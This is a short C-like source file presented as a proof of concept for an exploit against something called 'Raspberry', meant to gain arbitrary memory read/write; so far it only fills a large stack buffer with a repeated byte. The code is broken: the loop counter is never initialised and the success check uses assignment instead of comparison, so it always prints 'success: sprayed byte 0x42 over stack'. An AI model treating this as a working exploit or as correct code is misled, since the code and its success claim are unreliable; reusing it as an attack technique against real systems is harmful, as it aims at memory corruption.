// Raspberry
// This is a PoC that exploits Raspberry, to allow arbitrary memory r/w.
// Currently it only sprays bytes, but I will add memory r/w to ANYWHERE; at some point. 

void spray(char byte) {
	char buffer[0x20000];
	
	for (int j; j < 0x20000; j++) {
		buffer[j] = byte;
	};
	
	printc(buffer, byte);
	
	return;
};

void demo() {
	spray(0x42);
	
	clear_screen();
	
	if (video[0x1000] = 0x42) {
		printf("success: sprayed byte 0x42 over stack");
	};
};
